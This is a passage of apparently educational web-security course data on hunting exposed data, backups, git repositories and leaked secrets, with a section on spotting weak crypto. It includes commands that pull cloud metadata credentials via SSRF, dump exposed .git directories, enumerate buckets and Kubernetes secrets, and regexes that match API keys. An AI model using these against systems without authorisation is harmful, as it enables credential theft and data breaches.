            ["Health", "Medical records, prescriptions, diagnoses", "HIPAA violations, blackmail"],
            ["Internal docs", "Contracts, roadmaps, M&A info", "Competitive damage, insider trading"],
            ["Source code", "Proprietary algorithms, security logic", "Finding more vulns, IP theft"],
            ["Session data", "Session tokens, JWTs, refresh tokens", "Session hijacking"],
            ["Encryption keys", "AES keys, private keys, salts", "Decrypt everything"],
          ],
        },
      },
      {
        title: "Where Data Hides in Typical Apps",
        detailedDescription: `Modern applications don't just have one database - they have an ecosystem of data stores, each with different security properties. Understanding where data lives helps you find it.

**The Primary Database Isn't Everything**: Yes, PostgreSQL/MySQL/MongoDB holds the main data. But applications also use Redis/Memcached for caching (often unprotected), Elasticsearch for search (frequently exposed), and message queues for async processing. Each of these secondary stores often contains copies of sensitive data with weaker security.

**Cloud Storage Misconfigurations**: S3 buckets, Azure Blob containers, and GCS buckets are notoriously misconfigured. Developers set them to public during development and forget to lock them down. Tools like S3Scanner and GrayhatWarfare index millions of exposed buckets.

**Client-Side Storage**: Browser localStorage, sessionStorage, and IndexedDB often contain tokens, user data, and even cached API responses with sensitive information. Mobile apps store data in SQLite databases that persist even after logout. This data is accessible to anyone with physical device access.

**CDNs Cache Everything**: Content Delivery Networks cache responses to improve performance. But if authenticated responses get cached, they might serve User A's data to User B. Look for Cache-Control headers and test with different sessions.

**Logging Everything**: Modern observability means logging everything. That 'everything' often includes request bodies with passwords, responses with PII, and debug information with tokens.`,
        beginnerTips: [
          "Check browser DevTools Application tab for localStorage, sessionStorage, cookies - often contains tokens",
          "Redis and Memcached have no authentication by default - if you find one exposed, it's wide open",
          "Use Shodan to find exposed Elasticsearch, MongoDB, Redis instances belonging to your target",
          "Mobile app data persists even after logout - always check SQLite databases"
        ],
        realWorldExample: "In 2020, researchers found that Clearview AI's source code was exposed in a misconfigured cloud storage bucket. This included all their facial recognition secrets. Earlier, Twitch's entire source code leaked from a misconfigured server, exposing streamer payout data.",
        points: [
          "Primary databases: PostgreSQL, MySQL, MongoDB, etc.",
          "Search indexes: Elasticsearch, Solr, Algolia (often less protected)",
          "Cache layers: Redis, Memcached (no auth by default)",
          "Object storage: S3, Azure Blob, GCS (misconfigured buckets)",
          "CDNs: Cached responses including authenticated data",
          "Message queues: RabbitMQ, Kafka, SQS (sensitive data in transit)",
          "Logging systems: ELK stack, Splunk, CloudWatch",
          "Browser storage: localStorage, sessionStorage, IndexedDB",
          "Mobile offline storage: SQLite, Realm, Core Data",
        ],
        code: `# Check browser storage in DevTools console:
JSON.stringify(localStorage)
JSON.stringify(sessionStorage)

# Check for IndexedDB databases
indexedDB.databases()

# Mobile app SQLite (after extracting app data)
sqlite3 app.db ".tables"
sqlite3 app.db "SELECT * FROM users"`,
      },
      {
        title: "Patterns That Scream 'Dump Me'",
        detailedDescription: `Some application features are practically designed for data exfiltration. Learn to recognize these patterns and you'll find data exposures faster.

**Export/Download Features**: Any feature that exports data (CSV export, PDF report, backup download) is a potential mass data extraction point. These features are built for convenience, not security. Test: Does it paginate? Does it limit records? Can you export data you shouldn't see?

**Verbose Error Messages**: Detailed error messages are debugging gold for developers and attackers alike. Stack traces reveal file paths, SQL queries show database structure, and exception messages often include actual data values. Never ignore errors.

**GraphQL Introspection**: If GraphQL introspection is enabled (it often is), you can request the entire API schema. This reveals every type, field, query, and mutation - essentially a complete map of the data model. Use tools like GraphQL Voyager to visualize it.

**Debug Endpoints**: Development features that shouldn't exist in production: /debug, /trace, /actuator (Spring Boot), /phpinfo.php. These expose application internals, configurations, and sometimes allow code execution.

**Overly Generous APIs**: APIs that return full objects when only partial data is needed. Request a user list and get passwords too. Request product info and get internal cost data. Always examine exactly what's being returned.`,
        beginnerTips: [
          "Always test export features with minimum permissions - can a basic user export admin data?",
          "Trigger errors intentionally: malformed input, wrong types, boundary values - read what comes back",
          "For GraphQL, always check: POST to /graphql with '{__schema{types{name,fields{name}}}}'",
          "Compare API responses to what's shown in the UI - APIs often return extra fields"
        ],
        realWorldExample: "A bug bounty hunter found that a company's 'Export Users' feature allowed any authenticated user to download a CSV of ALL users, including admin accounts with email addresses and phone numbers. The feature was meant for admins only but authorization was never checked.",
        points: [
          "Verbose error messages showing SQL queries or stack traces",
          "Debug endpoints returning full application state",
          "'Download all' or 'Export to CSV' without pagination limits",
          "GraphQL introspection revealing the entire schema",
          "Admin panels with 'database backup' functionality",
          "Import features that show preview of all data",
          "Search that returns full objects instead of summaries",
          "APIs returning all fields when only some are needed",
          "Audit logs accessible to regular users",
          "'Forgot password' revealing if accounts exist",
        ],
        warning: "Features built for convenience (export, backup, debug) are often the fastest path to mass data extraction.",
      },
      {
        title: "Storage Misconfigurations to Hunt",
        detailedDescription: `Storage misconfigurations are some of the easiest and most impactful vulnerabilities to find. Companies rush to deploy cloud services without understanding their security models.

**S3 Buckets**: Amazon S3 buckets can be configured for public read, public write, or (worst case) public listing. Even if individual files aren't guessable, listing permissions let you enumerate everything. Bucket names often follow patterns: company-backup, company-logs, company-uploads.

**Firebase Realtime Database**: Firebase lets you set database rules for read/write access. The default rules are often too permissive. If you can access https://project.firebaseio.com/.json and get data, the database is misconfigured.

**Exposed Database Ports**: MongoDB (27017), Redis (6379), Elasticsearch (9200), and Memcached (11211) are frequently exposed to the internet with no authentication. Shodan and Censys index these continuously. One exposed database can leak everything.

**GraphQL Without Limits**: Even when GraphQL doesn't expose sensitive data directly, missing query depth/complexity limits allow denial of service. And without result limits, a single query might return millions of records.

**CDN and Caching Issues**: Cached responses might include auth tokens or session data. Test with multiple accounts and look for cross-user data leakage. Also check for host header injection that could poison caches.`,
        beginnerTips: [
          "Use GrayhatWarfare.com to search for S3 buckets by keyword - it indexes millions of public buckets",
          "For any app, try: curl 'https://[project-id].firebaseio.com/.json' - lots of Firebase apps are open",
          "Shodan dork: 'MongoDB Server Information' or 'Redis' to find exposed databases",
          "When you find a bucket, check both READ (can you download?) and LIST (can you enumerate?) permissions"
        ],
        realWorldExample: "In 2017, a security researcher found that Verizon had left 14 million customer records in a publicly accessible S3 bucket - including names, addresses, phone numbers, and PINs. The bucket had been exposed for months. This pattern repeats constantly: Accenture (137GB), US Army (100GB), and thousands more.",
        points: [
          "S3 buckets with public read or list permissions",
          "Azure Blob containers with anonymous access",
          "Firebase databases with world-readable rules",
          "MongoDB/Redis/Elasticsearch exposed to internet",
          "GraphQL with no query depth limits (resource exhaustion + data dump)",
          "APIs with no rate limiting on data export",
          "Backup files stored in publicly accessible locations",
          "Database connection strings in client-side code",
        ],
        code: `# Check S3 bucket permissions
aws s3 ls s3://bucket-name --no-sign-request

# Check for public Azure blobs
curl "https://account.blob.core.windows.net/container?restype=container&comp=list"

# Check Firebase rules
curl "https://project.firebaseio.com/.json"

# Shodan for exposed databases
shodan search "mongodb port:27017"
shodan search "redis port:6379"`,
      },
    ],
  },
  {
    id: "logs-backups",
    title: "4. Logs, Caches, Backups & Temp Files",
    icon: <HistoryIcon />,
    color: "#10b981",
    subsections: [
      {
        title: "Log File Hunting",
        detailedDescription: `Log files are one of the most underrated treasures in web security testing. Applications log everything - and developers often don't realize just how sensitive that 'debug information' is.

**Why Logs Are Goldmines**: During normal operation, applications log requests, errors, and debug information. When something goes wrong, logs might include the full request body (with passwords), the SQL query being executed (revealing database structure), stack traces (exposing file paths and code), or even raw credentials that were being processed.

**Where Logs Hide**: Beyond obvious /logs/ directories, look for debug endpoints like /debug/, /status/, /trace/. Spring Boot applications expose /actuator/ endpoints that can reveal everything from environment variables to heap dumps. PHP applications might have error_log in the web root. Java apps write to log4j files that might be accessible.

**The Debug Flag Problem**: Many applications have a debug mode that produces verbose logging. Developers enable it during development and forget to disable it for production. These debug logs often include full request/response bodies, database queries with bind parameters, and internal application state.

**Sensitive Data in Logs**: Passwords submitted in login forms, API keys in headers, session tokens, personal data, credit card numbers (yes, really) - all regularly appear in logs. Even 'sanitized' logs often miss something.`,
        beginnerTips: [
          "Always check /robots.txt and /.htaccess - they often disallow /logs/ directories (confirming they exist)",
          "Look for log files with dates: error-2024-01-15.log, access_20240115.log",
          "Try both /logs/ and /log/ (singular vs plural) - both are common",
          "Spring Boot actuator: try /actuator, /actuator/env, /actuator/heapdump - last one can contain passwords!"
        ],
        realWorldExample: "A researcher found that a major SaaS platform's /debug endpoint exposed complete request logs including plain-text passwords. The debug mode had been left on since development. The company paid $25,000 for this finding.",
        points: [
          "Error logs often contain stack traces, SQL queries, credentials",
          "Access logs reveal hidden endpoints and parameters",
          "Application logs may include sensitive business data",
          "Debug logs enabled in production = goldmine",
          "Audit logs show admin actions and sometimes credentials",
        ],
        table: {
          headers: ["Path Pattern", "What You Might Find"],
          rows: [
            ["/logs/, /log/", "Application and error logs"],
            ["/debug/, /status/", "Debug info, stack traces"],
            ["/health/, /metrics/", "System info, internal endpoints"],
            ["/trace/, /actuator/", "Spring Boot actuator endpoints"],
            ["/server-status", "Apache status page"],
            ["/nginx_status", "Nginx status info"],
            ["/.logs/, /var/log/", "System log directories"],
            ["/tmp/, /temp/", "Temporary file storage"],
          ],
        },
        code: `# Common log file names to brute force:
error.log, errors.log, error_log
access.log, access_log
debug.log, debug.txt
app.log, application.log
server.log, system.log
sql.log, query.log
audit.log, security.log
*.log.1, *.log.old, *.log.bak`,
      },
      {
        title: "Backup and Old File Discovery",
        detailedDescription: `Backup files are perhaps the easiest high-impact vulnerabilities to find. The pattern is simple: developers and systems create copies of files, and those copies are often left in web-accessible locations.

**How Backups Get Created**: Developers editing config.php might rename it to config.php.bak before making changes. Editors like vim create .swp files automatically. Deployment systems archive old versions. Database admins dump databases to .sql files. These files accumulate over time and are rarely cleaned up.

**Why Backups Are Dangerous**: That config.php.bak file contains the same database credentials as config.php - but because it ends in .bak instead of .php, the web server sends it as plain text instead of executing it. You get to read the raw source code with all its embedded secrets.

**Git Exposure**: The .git directory contains the entire repository history. If it's web-accessible, you can reconstruct the complete source code using tools like git-dumper or GitTools. Even better, git history often contains credentials that developers 'removed' - but they're still in previous commits.

**Database Dumps**: Files like backup.sql, database.dump, or db.sqlite sitting in the web root give you the entire database contents. These are shockingly common, especially in shared hosting environments.`,
        beginnerTips: [
          "For every file you find, try adding common backup extensions: .bak, .old, .orig, ~, .swp, .copy",
          "Check for .git/HEAD - if it returns 'ref: refs/heads/main', the entire repo is exposed",
          "Use ffuf or gobuster with -x flag to append extensions: -x php,bak,old,zip,sql",
          "Search Google: site:target.com filetype:sql OR filetype:bak OR filetype:zip"
        ],
        realWorldExample: "In 2015, a researcher downloaded Nissan's entire source code after finding an exposed .git directory. More recently, exposed .git directories have leaked source code from major banks, government agencies, and Fortune 500 companies. This remains one of the most common misconfigurations.",
        points: [
          "Developers often leave backup copies during editing",
          "Deployment processes may leave old versions",
          "Database dumps sometimes live in web root",
          "Configuration backups with credentials",
          "Version control artifacts (.git, .svn)",
        ],
        table: {
          headers: ["Extension/Pattern", "What It Usually Is"],
          rows: [
            [".bak, .backup", "Backup copy of any file"],
            [".old, .orig", "Original before modification"],
            ["~, .swp, .swo", "Vim swap/backup files"],
            [".save, .saved", "Saved copies"],
            [".copy, .tmp", "Temporary copies"],
            [".zip, .tar, .gz", "Archived backups"],
            [".sql, .dump", "Database exports"],
            [".dist, .default", "Default/template configs"],
            ["Copy of *, (1), _backup", "Windows-style copies"],
          ],
        },
        code: `# Directory brute-forcing for backups
ffuf -w wordlist.txt -u https://target.com/FUZZ -e .bak,.old,.zip,.sql

# Check for Git exposure
curl https://target.com/.git/HEAD
curl https://target.com/.git/config

# If .git is exposed, dump it:
git-dumper https://target.com/.git/ ./output

# Common backup filenames
backup.zip, backup.sql, backup.tar.gz
db_backup.sql, database.sql, dump.sql
www.zip, site.zip, html.zip
config.php.bak, web.config.old`,
      },
      {
        title: "Temp Files and Caches",
        detailedDescription: `Temporary files are the forgotten middle children of web security. Applications create them constantly - for uploads, exports, sessions, and caching - but rarely clean them up properly.

**Upload Processing Temps**: When you upload a file, it's usually first written to a temporary directory, processed/validated, then moved to its final location. If validation fails - or the process crashes - that temp file might remain accessible. Worse, temp directories are rarely protected.

**Export and Report Caches**: Generate a PDF report? The application might cache it in /exports/temp/report_12345.pdf for performance. Cancel an export midway? The partial file might still be there. These caches often lack authorization checks.

**Session Files**: PHP and other frameworks can store sessions as files. If your session file is at /tmp/sess_abc123 and that directory is web-accessible, attackers can read session data. Even worse, some configurations allow session file injection.

**The Timing Attack**: Many temp file vulnerabilities have a race condition component. You might need to catch the file between creation and deletion. Start a large export, quickly access the temp directory, and you might catch sensitive data in transit.

**Preview and Thumbnail Caches**: Applications that preview documents or generate thumbnails cache these for performance. But the cache might not have the same access controls as the original file - you might be able to preview files you can't download.`,
        beginnerTips: [
          "Start a large export, immediately cancel it, then check /export/, /temp/, /reports/temp/ directories",
          "Upload invalid files deliberately - they might be written to temp before validation fails",
          "Look for patterns like /tmp/{random}.pdf, /cache/preview_{id}.jpg - IDs might be sequential",
          "PHP session files: if you know someone's PHPSESSID cookie, try /tmp/sess_[PHPSESSID]"
        ],
        realWorldExample: "A bug bounty hunter discovered that a company's report export feature cached reports in /tmp/ before emailing them. By guessing sequential temp file names, they could download any user's financial reports during the brief window before the file was deleted.",
        points: [
          "Export/report caches may contain sensitive data",
          "Upload temp directories before files are processed",
          "Session files in accessible locations",
          "Preview/thumbnail caches for documents",
          "API response caches",
          "Search index caches",
        ],
        code: `# Common temp/cache locations:
/tmp/, /temp/, /cache/
/uploads/tmp/, /files/temp/
/.cache/, /var/cache/
/sessions/, /sess_*
/preview/, /thumbnails/
/export/, /reports/temp/

# PHP session files
/tmp/sess_[session_id]
/var/lib/php/sessions/sess_*`,
        testIdeas: [
          "Start a data export, cancel it - is the temp file still there?",
          "Upload a file, fail validation - is it still in temp?",
          "Check if cache files are accessible without auth",
          "Look for session files with predictable names",
        ],
      },
      {
        title: "Finding Hidden Files - Techniques",
        detailedDescription: `Finding hidden files is a skill that combines automated scanning with creative thinking. The best hunters use multiple techniques together.

**Directory Brute-Forcing**: Tools like gobuster, ffuf, and feroxbuster try thousands of common filenames against a target. The quality of your wordlist matters enormously. Use SecLists (the industry standard) and add target-specific words from reconnaissance.

**Extension Fuzzing**: Don't just look for /config - try /config.php, /config.php.bak, /config.php.old, /config.xml, /config.json, /config.yml. A single file might exist with dozens of extensions and backup versions.

**Historical Discovery**: The Wayback Machine archives websites over time. A file that existed in 2020 might still be there - just hidden from current navigation. Tools like waybackurls extract all archived URLs. Google's cache and cached search results also reveal historical files.

**JavaScript Mining**: Modern applications load JavaScript bundles that reference API endpoints, file paths, and hidden features. Tools like LinkFinder, JSParser, and Burp's JS Link Finder extract these references automatically.

**Robots.txt and Sitemap**: These files are meant to guide search engines, but they also guide attackers. Robots.txt often disallows sensitive directories (confirming they exist), and sitemaps list every intended URL.

**Error Page Analysis**: 404 pages sometimes reveal directory structure. Try requesting /definitely-not-real-dir/test.php and see if the error message reveals the web root path.`,
        beginnerTips: [
          "Use SecLists wordlists - they're comprehensive and maintained: /usr/share/seclists/Discovery/Web-Content/",
          "Run waybackurls target.com | grep -E '\\.(config|sql|bak|log|zip)$' to find historical sensitive files",
          "Always run gobuster with multiple extensions: -x php,asp,aspx,jsp,html,js,txt,bak,old,zip",
          "Check robots.txt 'Disallow' entries - they often point to real sensitive directories"
        ],
        realWorldExample: "A penetration tester found a company's API documentation at /api-docs/ which wasn't linked anywhere on the site. The waybackurls tool revealed it had existed for years, and it documented internal endpoints that led to data exposure. Historical reconnaissance is powerful.",
        points: [
          "Directory brute-forcing with good wordlists",
          "Append common extensions to known files",
          "Check robots.txt and sitemap.xml for hints",
          "Look at JavaScript for referenced paths",
          "Wayback Machine for historical file listings",
          "Google dorking: site:target.com filetype:log",
          "Check error pages for path disclosure",
        ],
        code: `# Comprehensive discovery
gobuster dir -u https://target.com -w /usr/share/wordlists/dirb/common.txt -x php,bak,old,zip,sql,log,txt

# Check Wayback Machine for old files
waybackurls target.com | grep -E "\\.(bak|old|zip|sql|log|config)$"

# Google dorking
site:target.com filetype:log
site:target.com filetype:sql
site:target.com filetype:bak
site:target.com "index of" backup`,
      },
    ],
  },
  {
    id: "secrets-hunting",
    title: "5. Secrets Hunting",
    icon: <VpnKeyIcon />,
    color: "#f59e0b",
    subsections: [
      {
        title: "Secrets in Code and Repos",
        detailedDescription: `Source code repositories are treasure troves of secrets. Developers regularly commit credentials during development, intending to remove them later - but git remembers everything.

**The Git History Problem**: Git is designed to never forget. Even if a developer removes a password in a later commit, the original commit with the password still exists in history. Tools like truffleHog and gitleaks scan through every commit to find secrets that were 'removed' years ago.

**Where Secrets Hide**: Configuration files (.env, config.json, application.yml) are the obvious places, but secrets also lurk in test files (developers use real credentials for integration tests), CI/CD configs (GitHub Actions workflows, Jenkins pipelines), and infrastructure-as-code (Terraform state files that store the actual values of sensitive variables).

**The Development Environment Trap**: Files like .env.local, local.settings.json, and docker-compose.override.yml are meant for local development - but developers copy production secrets into them for convenience, then accidentally commit them.

**Reflog Gold**: Even if a branch is deleted, git reflog keeps references to recent commits for recovery purposes. Attackers can find deleted commits that contained secrets, even after the branch is gone from the main history.`,
        beginnerTips: [
          "Always scan git repos with truffleHog or gitleaks before reporting - they find things grep misses",
          "Check .gitignore to see what SHOULD be excluded - then verify those files aren't committed anyway",
          "Look for terraform.tfstate files - they contain plaintext values of all 'secret' variables",
          "CI/CD configs often reference secret names - even if values are hidden, knowing the names helps"
        ],
        realWorldExample: "In 2019, researchers found that Uber's iOS source code repository contained an AWS key that was committed in 2014 and 'removed' shortly after. The key was still valid and had access to S3 buckets with 57 million user records. This was the secret that enabled the 2016 Uber breach.",
        points: [
          "Configuration files: .env, config.*, settings.*, application.yml",
          "Local development files: local.settings.json, .env.local, .env.development",
          "Test files often have hardcoded credentials for test environments",
          "CI/CD configs: .github/workflows/*.yml, .gitlab-ci.yml, Jenkinsfile",
          "Infrastructure as Code: terraform.tfstate, *.tfvars (often in state files)",
          "Docker configs: docker-compose.yml, Dockerfile (build args)",
          "Sample/example scripts that work 'out of the box' with real creds",
        ],
        code: `# Git history mining
git log --all --full-history -- "**/config*" "**/secret*" "**/.env*"
git log -p --all -S "password" -- . 
git log -p --all -S "API_KEY" -- .

# Search all commits for secrets
git rev-list --all | xargs git grep -l "password\\|secret\\|api.key"

# Check reflog for deleted commits
git reflog | head -20
git show [commit-hash]

# Clone and scan with tools
trufflehog git https://github.com/target/repo
gitleaks detect --source=./repo`,
      },
      {
        title: "Common Secret Patterns",
        detailedDescription: `Secrets follow predictable patterns. Learning to recognize these patterns by sight makes manual code review much faster, and helps you write better regex for automated scanning.

**Prefix-Based Identification**: Many services use distinctive prefixes for their API keys. AWS access keys always start with 'AKIA', GitHub personal access tokens start with 'ghp_', and Stripe live keys start with 'sk_live_'. These prefixes exist specifically for easy identification - use them.

**Structure-Based Patterns**: JWTs always have the format 'eyJ...', because that's what 'eyJ' means in Base64 (it's the opening brace of the JSON header). Private keys are easy to spot with their '-----BEGIN ... PRIVATE KEY-----' delimiters.

**Context Clues**: Even when you can't identify a specific service, certain patterns indicate secrets: high-entropy strings (random-looking characters), strings assigned to variables named 'key', 'secret', 'password', 'token', or strings that are 32-64 characters of mixed alphanumeric characters.

**Environment Variable Formats**: Secrets in environment variables follow patterns like SECRET_KEY=value or DATABASE_PASSWORD='...' - the variable names are your clue.`,
        beginnerTips: [
          "Memorize the common prefixes: AKIA (AWS), ghp_ (GitHub), sk_live_ (Stripe), AIza (Google), xox (Slack)",
          "JWTs are always 3 base64 parts separated by dots - they decode to readable JSON",
          "High entropy + 32-64 chars + alphanumeric = probably a secret worth investigating",
          "When you find a secret, Google the prefix to identify the service before reporting"
        ],
        realWorldExample: "A security researcher wrote a simple regex that matched AWS keys (AKIA[0-9A-Z]{16}) and scanned GitHub public repositories. They found thousands of valid AWS credentials, many with full admin access. Some keys had been exposed for years.",
        table: {
          headers: ["Service", "Pattern/Format", "Regex Hint"],
          rows: [
            ["AWS Access Key", "AKIA[0-9A-Z]{16}", "Starts with AKIA"],
            ["AWS Secret Key", "40 chars base64", "Often near access key"],
            ["GitHub Token", "ghp_[A-Za-z0-9_]{36}", "Starts with ghp_"],
            ["Slack Token", "xox[baprs]-...", "Starts with xox"],
            ["Google API Key", "AIza[0-9A-Za-z\\-_]{35}", "Starts with AIza"],
            ["Stripe Key", "sk_live_[0-9a-zA-Z]{24}", "sk_live_ prefix"],
            ["JWT", "eyJ[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+\\.", "Base64 JSON structure"],
            ["Private Key", "-----BEGIN.*PRIVATE KEY-----", "PEM format"],
            ["Generic password", "password.*=.*['\"]", "Assignment patterns"],
          ],
        },
      },
      {
        title: "Secrets in Front-End and Binaries",
        detailedDescription: `Client-side code is code that runs on the user's device - which means users can read it. Developers often forget this when embedding API keys and secrets.

**JavaScript Bundle Analysis**: Modern web apps bundle JavaScript into minified files like main.js or app.chunk.js. These bundles contain everything the front-end needs - including API keys for services like Google Maps, Stripe, or Firebase. Use browser DevTools or tools like LinkFinder to extract strings.

**Source Maps**: Source maps (.map files) are debugging aids that map minified code back to original source code. They often exist in production and can contain the complete original code with comments - including comments that say things like '// TODO: remove this API key before deployment'.

**Mobile App Reverse Engineering**: APK files (Android) and IPA files (iOS) are just ZIP archives with predictable structures. Use apktool for Android and tools like iMazing for iOS to extract the contents. Look in res/values/strings.xml, shared_prefs, and embedded plist files.

**Desktop and Electron Apps**: Electron apps (Slack, Discord, VS Code, etc.) bundle a complete Chromium browser with JavaScript code. The code lives in .asar archives that can be extracted with standard tools. Native desktop apps often have embedded strings that tools like 'strings' can extract.`,
        beginnerTips: [
          "In browser DevTools, search the Sources tab for 'api_key', 'secret', 'password' - you'll be surprised",
          "For any .js file, try appending .map - source maps are often available",
          "Use 'apktool d app.apk' then 'grep -r' for secrets - it's surprisingly effective",
          "For Electron apps: find the resources/app.asar file and run 'npx asar extract app.asar output/'"
        ],
        realWorldExample: "Researchers found that a major food delivery app embedded their Google Maps API key with unrestricted permissions in their Android app. The key could be used for any Google Cloud service, potentially costing the company thousands per day in fraudulent API calls.",
        points: [
          "JavaScript bundles often contain API keys, especially for third-party services",
          "Source maps (.map files) can reveal original source with comments",
          "Mobile APKs: strings, assets, shared_prefs, res/values/strings.xml",
          "iOS IPAs: embedded plists, entitlements, keychain access groups",
          "Desktop apps: resources, embedded configs, update mechanisms",
          "Electron apps: essentially web apps, check asar archives",
        ],
        code: `# Extract strings from JavaScript
curl https://target.com/main.js | grep -oE '[A-Za-z0-9_]{20,}' | sort -u

# Find source maps
curl https://target.com/main.js | grep -i sourceMappingURL
curl https://target.com/main.js.map

# APK analysis
apktool d app.apk
grep -r "api_key\\|password\\|secret" app/

# Search for hardcoded strings
strings binary | grep -iE "password|secret|key|token"

# Electron app extraction
npx asar extract app.asar extracted/`,
        testIdeas: [
          "Search for API keys that work in production",
          "Check if debug/test keys give elevated access",
          "Look for internal API endpoints in mobile apps",
          "Find admin credentials in test configurations",
        ],
      },
      {
        title: "Secrets in Infrastructure",
        detailedDescription: `Cloud infrastructure has its own secret ecosystem. Understanding how cloud providers handle credentials is essential for modern security testing.

**Cloud Metadata Services**: Every major cloud provider (AWS, Azure, GCP) runs a metadata service that cloud instances can query for configuration and credentials. The magic IP 169.254.169.254 is the AWS metadata endpoint - if you can reach it via SSRF, you can often steal temporary credentials with significant permissions.

**Open Dashboards Are Everywhere**: Developers deploy Prometheus, Grafana, Kibana, Jenkins, and other tools for monitoring and CI/CD. These tools often get deployed without authentication 'because they're internal'. But they're frequently exposed to the internet, and they contain secrets - Jenkins especially often stores credentials in plaintext.

**Container and Kubernetes Secrets**: Kubernetes stores secrets in base64 encoding (NOT encryption - just encoding). If you have any cluster access, 'kubectl get secrets' reveals everything. Container registries often allow anonymous pulls, letting you download images that contain embedded credentials.

**CI/CD Build Logs**: CI systems like GitHub Actions and GitLab CI try to mask secrets in logs, but this masking isn't perfect. Secrets in non-standard formats, or secrets that get transformed during the build, often appear in plain text in build logs.`,
        beginnerTips: [
          "For any SSRF, try http://169.254.169.254/latest/meta-data/ - this is the AWS metadata service",
          "Search Shodan for 'Jenkins' 'Grafana' 'Kibana' + target company name for exposed dashboards",
          "Base64 decode all Kubernetes secrets - they're obfuscated, not encrypted: echo 'value' | base64 -d",
          "Check if container registries allow anonymous docker pull - many do"
        ],
        realWorldExample: "The Capital One breach was enabled by SSRF to AWS metadata. The attacker reached the metadata service, obtained temporary IAM credentials, and used those credentials to download 100 million customer records from S3. Cloud metadata SSRF is one of the most impactful vulnerability classes.",
        points: [
          "Cloud metadata services: AWS (169.254.169.254), Azure, GCP",
          "Environment variables in server responses or error pages",
          "Open dashboards: Prometheus, Grafana, Kibana, Jenkins",
          "CI/CD pipeline outputs and build logs",
          "Container registries with public images",
          "Kubernetes secrets (if you have cluster access)",
          "Service mesh configs and sidecar proxies",
        ],
        code: `# AWS metadata (from SSRF or compromised instance)
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Azure metadata
curl -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"

# GCP metadata
curl -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"

# Kubernetes secrets (if you have access)
kubectl get secrets --all-namespaces
kubectl get secret [name] -o jsonpath='{.data}'`,
        warning: "Cloud metadata endpoints are a goldmine via SSRF - they often return temporary credentials with significant permissions.",
      },
      {
        title: "Secret Verification",
        detailedDescription: `Finding a potential secret is only half the job. You need to verify it's valid without causing damage - this is where many bug bounty hunters go wrong.

**The Verification Dilemma**: Reporting an invalid or expired secret wastes everyone's time. But using a secret improperly can cross legal and ethical lines. The solution is safe verification - proving a secret works without actually exploiting it.

**Safe Verification Methods**: Every major service has 'identity' or 'whoami' endpoints that let you check credentials without taking any action. 'aws sts get-caller-identity' for AWS, '/user' for GitHub tokens, '/auth.test' for Slack. These endpoints prove the secret is valid and show what access it provides.

**What To Document**: When reporting a secret finding, document: where you found it, the type of secret, what access it provides (from the whoami response), NOT the full secret value (just enough to identify it). Include evidence of validity (a redacted screenshot) but never include the full working credential in your report.

**Scope and Ethics**: Some credentials might technically be valid but within acceptable risk (test environment keys, intentionally public API keys). Understand the context before reporting. And NEVER use found credentials to access data beyond verification - that crosses from security research into unauthorized access.`,
        beginnerTips: [
          "Always use read-only verification: aws sts get-caller-identity, not aws s3 ls (which might list sensitive buckets)",
          "For unknown services, look for '/api/me', '/api/whoami', '/api/user' endpoints",
          "Include partial secrets in reports: 'ghp_xxxx...xxxx' (first and last 4 chars) so the company can identify it",
          "Screenshot your verification but redact the full credential - prove validity without exposing the value"
        ],
        realWorldExample: "A bug bounty hunter found an AWS key and verified it with get-caller-identity - safe. Then they ran 'aws s3 ls' to see what buckets existed - less safe but arguably necessary. Then they viewed files in a bucket - this crossed into unauthorized access. The company reported them for exceeding scope. Always define your verification boundary clearly.",
        points: [
          "Always verify secrets in a way that doesn't cause damage",
          "For API keys: make a read-only API call",
          "For database creds: connect but don't modify data",
          "For cloud creds: check permissions with read-only actions",
          "Document the finding and impact without exploitation",
          "Be careful with rate limits and lockouts",
        ],
        code: `# Safe AWS key verification
aws sts get-caller-identity --profile found-creds

# Safe GitHub token check
curl -H "Authorization: token ghp_xxx" https://api.github.com/user

# Safe Slack token check
curl -H "Authorization: Bearer xoxb-xxx" https://slack.com/api/auth.test

# Check what permissions an API key has without using them
# Most services have a "whoami" or "info" endpoint`,
      },
    ],
  },
  {
    id: "crypto-misuse",
    title: "6. Exploiting Crypto Misuse",
    icon: <EnhancedEncryptionIcon />,
    color: "#6366f1",
    subsections: [
      {
        title: "Spotting Roll-Your-Own Crypto",
        detailedDescription: `The first rule of cryptography is: don't roll your own. Yet developers constantly reinvent encryption, usually badly. Learning to spot homemade crypto is one of the most valuable skills in security testing.

**Why Custom Crypto Fails**: Modern encryption algorithms like AES have been analyzed by thousands of cryptographers over decades. Custom algorithms are typically designed by one developer who might not understand why certain patterns are dangerous. XOR looks secure but is trivially reversible. Base64 looks encrypted but is just encoding. Character substitution was broken during World War II.

**The Encoding vs Encryption Confusion**: Base64 is the most common fake encryption. It transforms data into a different format but provides ZERO security - it's fully reversible by design. If 'encrypted' data starts with 'eyJ' (base64-encoded JSON), it's not encrypted. Similarly, hex encoding (all a-f, 0-9) is just a different representation.

**Hashing Isn't Encryption**: MD5('password') always produces the same output, and that output can't be turned back into 'password' (unlike encryption). But developers misuse hashes: they 'encrypt' data with MD5, thinking it's secure. Rainbow tables and hashcat make hash reversal trivial for common inputs.

**Random Number Failures**: Math.random() and similar functions produce predictable pseudo-random numbers that are NOT suitable for cryptographic purposes. Secrets, tokens, and IVs generated with these functions can be predicted.`,
        beginnerTips: [
          "If 'encrypted' data always starts with the same prefix, it's probably not encryption (or it's using ECB mode)",
          "Base64 decode everything that looks encrypted - if it becomes readable JSON/XML, report weak crypto",
          "Look for functions named 'encrypt' or 'decrypt' in JavaScript - they're often just base64",
          "If you can predict the output of a 'random' function, it's cryptographically broken"
        ],
        realWorldExample: "A major airline's loyalty program 'encrypted' reward codes using simple XOR with a static key. A researcher reversed the algorithm, generated millions of valid codes, and could have redeemed unlimited free flights. The company paid a substantial bounty.",
        points: [
          "Custom 'encryption' classes in source code",
          "XOR with a static key (reversible with known plaintext)",
          "Base64 presented as 'encryption' (it's encoding, not encryption)",
          "ROT13, character substitution, or transposition ciphers",
          "MD5 or SHA1 for 'encrypting' sensitive data (they're hashes)",
          "Custom key derivation instead of PBKDF2/Argon2",
          "Homemade random number generators for cryptographic purposes",
        ],
        code: `# Signs of weak crypto in code:
"encrypt" function that's just base64
XOR with a hardcoded key
MD5/SHA1 used for anything but checksums
Math.random() or rand() for security purposes
Custom substitution ciphers

